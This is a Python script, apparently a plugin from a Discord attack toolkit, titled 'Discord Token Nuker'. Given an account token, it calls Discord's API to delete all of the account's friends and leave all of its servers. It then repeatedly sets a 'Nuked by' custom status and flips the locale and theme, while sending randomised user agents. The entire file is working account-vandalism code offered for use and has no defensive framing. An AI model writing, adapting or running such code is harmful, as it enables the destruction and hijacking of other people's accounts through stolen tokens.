# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    from itertools import cycle
    import random
    import requests
    import time
except Exception as e:
    MissingModule(e)

Title("Discord Token Nuker")
Connection()
CheckGithubStar()

try:
    token = ChoiceToken()
    new_status = input(f"{INPUT} Custom Status {red}->{reset} ").strip()

    try:
        loop_count = int(input(f"{INPUT} Number of Loops {red}->{reset} ").strip())
    except:
        ErrorNumber()

    headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": RandomUserAgents()}
    default_status = f"Nuked by {name_tool} | {github_url}"
    custom_status = f"{new_status} | {name_tool}"
    themes_cycle = cycle(["dark", "light"])

    def RemoveFriends(token, headers):
        try:
            friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            for friend in friends:
                if friend.get("type") != 1:
                    continue
                friend_id = friend["id"]
                response = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend_id}", headers=headers)
                if response.status_code == 204:
                    print(f"{SUCCESS} Status:{red} Deleted {white}| Friend Id:{red} {friend_id}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Friend Id:{red} {friend_id}", reset)
        except Exception as e:
            print(f"{ERROR} Status:{red} Error   {white}| Error:{red} {e}", reset)

    def LeaveServers(token, headers):
        try:
            guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
            for guild in guilds:
                guild_id = guild["id"]
                response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
                if response.status_code == 204:
                    print(f"{SUCCESS} Status:{red} Deleted {white}| Server Id:{red} {guild_id}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Server Id:{red} {guild_id}", reset)
        except Exception as e:
            print(f"{ERROR} Status:{red} Error   {white}| Error:{red} {e}", reset)

    RemoveFriends(token, headers)
    LeaveServers(token, headers)

    for _ in range(loop_count):
        for status_text in [default_status, custom_status]:
            try:
                response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"custom_status": {"text": status_text}})
                if response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Changed {white}| Custom Status:{red} {status_text}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Custom Status:{red} {status_text}", reset)
            except:
                print(f"{ERROR} Status:{red} Error   {white}| Custom Status:{red} {status_text}", reset)

            for _ in range(5):
                try:
                    random_language = random.choice(["zh", "ar", "ja", "ko", "ru"])
                    response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={'locale': random_language})
                    if response.status_code == 200:
                        print(f"{SUCCESS} Status:{red} Changed {white}| Language:{red} {random_language}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed  {white}| Language:{red} {random_language}", reset)
                except:
                    print(f"{ERROR} Status:{red} Error   {white}| Language:{red} {random_language}", reset)

                try:
                    theme = next(themes_cycle)
                    response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={'theme': theme})
                    if response.status_code == 200:
                        print(f"{SUCCESS} Status:{red} Changed {white}| Theme:{red} {theme}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed  {white}| Theme:{red} {theme}", reset)
                except:
                    print(f"{ERROR} Status:{red} Error   {white}| Theme:{red} {theme}", reset)

                time.sleep(0.33)

    Continue()
    Reset()

except Exception as e:
    Error(e)